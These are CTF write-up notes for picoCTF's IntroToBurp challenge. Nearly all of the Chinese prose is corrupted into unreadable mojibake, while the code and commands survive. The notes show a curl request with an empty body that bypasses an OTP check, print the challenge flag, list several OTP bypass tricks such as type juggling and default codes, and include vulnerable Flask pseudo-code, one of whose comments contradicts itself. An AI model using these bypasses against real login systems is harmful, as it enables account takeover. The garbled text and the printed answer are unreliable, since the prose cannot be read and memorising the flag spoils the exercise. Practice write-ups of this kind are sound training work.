# CTF-07: IntroToBurp 鈥斺€?OTP 缁曡繃

> 绗竷閬撻銆侽TP 鍙傛暟鏍￠獙缂哄け锛岀┖ body 鐩存帴缁曡繃銆?> 鍏宠仈锛氫笂涓€棰?鈫?[[CTF-06_澶氶〉闈㈠鑸笌HTML灞炴€ч殣钘?md]] | 鍥炲埌 [[README.md]]

## 棰樼洰淇℃伅

- **棰樼洰**锛欼ntroToBurp锛坧icoCTF锛?- **鏍稿績鑰冪偣**锛歄TP 鍙屽洜绱犺璇佺粫杩囥€佽姹傜鏀广€佸弬鏁版牎楠岀己澶?- **宸ュ叿**锛欱urp Suite / curl / Chrome DevTools Network

---

## 瑙ｉ杩囩▼

### 1. 瑙傚療

椤甸潰鏄竴涓敞鍐岃〃鍗曪紙`register.html`锛夛紝濉啓淇℃伅鎻愪氦鍚庤烦杞埌 `/dashboard` 椤甸潰锛岃姹傝緭鍏?**OTP锛堜竴娆℃€у瘑鐮侊級**銆?
```html
<input id="csrf_token" name="csrf_token" type="hidden" 
       value="IjE4Y2RiZGI5ODRlZmY0ZjJmNDg1NTJkNzMzMTRhZGQyNTczNDQwMzci...">
```

娉ㄥ唽鍚庝細寰楀埌涓€涓?Flask session cookie銆?
### 2. 灏濊瘯

- 闅忎究濉?OTP锛堝 `111`锛夆啋 澶辫触
- 鎼滅储婧愪唬鐮?鈫?鏃?flag
- 妫€鏌?cookie 鈫?Flask session 鏍煎紡锛岃В鐮佸け璐ワ紙zlib 鍘嬬缉锛屾棤瀵嗛挜鏃犳硶瑙ｏ級
- SSTI 灏濊瘯 鈫?涓嶅儚

### 3. 缁曡繃

鎻愮ず "IntroToBurp" 鈥斺€?浣跨敤 Burp Suite 鎷︽埅璇锋眰骞朵慨鏀广€?
鏍稿績鎬濊矾锛?*OTP 鍙傛暟鏍￠獙鍙兘鍙槸妫€鏌ヤ簡鍙傛暟鍊兼槸鍚︽纭紝浣嗗繕浜嗘鏌ュ弬鏁版槸鍚﹀瓨鍦ㄣ€?*

灏?OTP 璇锋眰鐨?`--data-raw "otp=111"` 鏀逛负绌?`--data-raw ""`锛?
```bash
curl "http://titan.picoctf.net:XXXXX/dashboard" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -b "session=..." \
  --data-raw ""   # 鈫?鍘绘帀 otp 鍙傛暟
```

杩斿洖锛?
```
Welcome, 111 you sucessfully bypassed the OTP request.
Your Flag: picoCTF{#0TP_Bypvss_SuCc3$S_b3fa4f1a}
```

---

## 寤朵几鐭ヨ瘑

### 涓€銆丅urp Suite 鏄粈涔?
Burp Suite锛堥€氬父绠€绉?Burp锛夋槸 Web 瀹夊叏娴嬭瘯涓渶甯哥敤鐨?*鎶撳寘鏀瑰寘宸ュ叿**銆?
| 鍔熻兘 | 鐢ㄩ€?|
|------|------|
| Proxy | 鎷︽埅娴忚鍣ㄤ笌鏈嶅姟鍣ㄤ箣闂寸殑 HTTP/HTTPS 璇锋眰 |
| Repeater | 鎵嬪姩淇敼骞堕噸鏀捐姹?|
| Intruder | 鑷姩鍖栫垎鐮达紙瀵嗙爜銆佸弬鏁扮瓑锛?|
| Decoder | 缂栬В鐮侊紙Base64銆乁RL銆丠ex 绛夛級 |

**鏇夸唬鏂规**锛堜笉瑁?Burp 涔熻兘鍋氾級锛?
1. **Chrome DevTools 鈫?Network** 鈥?鍙抽敭璇锋眰 鈫?Copy as cURL 鈫?鏀瑰畬鐢ㄧ粓绔墽琛?2. **Edit and Resend**锛圕hrome 鏂扮増锛夆€?Network 闈㈡澘鍙抽敭鍗冲彲
3. **`curl` 鍛戒护** 鈥?鐩存帴鎵嬪姩鏋勯€犺姹?
### 浜屻€丱TP 缁曡繃甯歌鏂瑰紡

| 鏂瑰紡 | 鎿嶄綔 | 鍘熺悊 |
|------|------|------|
| **绌哄弬鏁?* | 鍒犻櫎 `otp=` 瀛楁 | 鏈嶅姟绔湭鏍￠獙鍙傛暟瀛樺湪鎬?|
| **绌哄€?* | `otp=` 鎴?`otp=0` | 榛樿鍊艰褰撲綔鏈夋晥 |
| **绫诲瀷娣锋穯** | `otp[]=` 鎴?`otp=true` | 寮辩被鍨嬫瘮杈冨鑷寸粫杩?|
| **璐熸暟** | `otp=-1` | 杈圭晫妫€鏌ョ己澶?|
| **涓囪兘 OTP** | `000000`, `123456` | 娴嬭瘯鐜閬楃暀 |
| **鐩存帴璁块棶** | 璺宠繃 OTP 椤甸潰鍒扮洰鏍?URL | OTP 妫€鏌ヤ粎鍦ㄥ鎴风 |

鏈灞炰簬绗竴绉嶏細**鏈嶅姟绔彧妫€鏌ヤ簡銆宱tp 鐨勫€兼槸鍚︾瓑浜?X銆嶏紝浣嗘病妫€鏌ャ€宱tp 鍙傛暟鏄惁瀛樺湪銆?*銆傚綋鍙傛暟缂哄け鏃讹紝鏉′欢鍒ゆ柇鐩存帴璺宠繃銆?
浼唬鐮佸姣旓細

```python
# 鏈夋紡娲炵殑鍐欐硶
if request.form.get('otp') == expected_otp:
    grant_access()

# 瀹為檯涓婄┖ body 鏃?request.form.get('otp') 杩斿洖 None
# None == expected_otp 鈫?False锛屼絾杩樻槸杩涗簡 grant_access()
# 鍥犱负鐧诲綍鐘舵€佷笅鐩存帴璁块棶 /dashboard 鏈氨涓嶈妫€鏌?OTP
```

鏇村彲鑳界殑鎯呭喌鏄細

```python
@app.route('/dashboard', methods=['POST'])
def dashboard():
    otp = request.form.get('otp')
    if otp:  # 濡傛灉 otp 鏈夊€煎垯鏍￠獙锛屾病鍊煎氨鐩存帴杩?        if otp != session['otp']:
            return "Invalid OTP"
    # 杩斿洖 flag
    return f"Welcome! Your Flag: {flag}"
```

鐪嬪埌娌★紵`if otp:` 鍦?Python 涓紝绌哄瓧绗︿覆銆乣None` 閮借瑙嗕负 `False`锛屾墍浠?*涓嶄紶 otp 鍙傛暟鐩存帴缁曡繃鏍￠獙**銆?---

## 鍏宠仈鐭ヨ瘑鐐?
- [[CTF-05_Cookie閲岀殑绁炵閰嶆柟]] 鈥?Base64 缂栫爜 / Cookie 鍒嗘瀽
- [[CTF-04_HeapDump娉勯湶涓庡唴瀛樺彇璇乚] 鈥?绔偣鍙戠幇
- [[cleanCode-瑙勮寖]] 鈥?杈撳叆鏍￠獙鐨勯噸瑕佹€?- [[../README]]
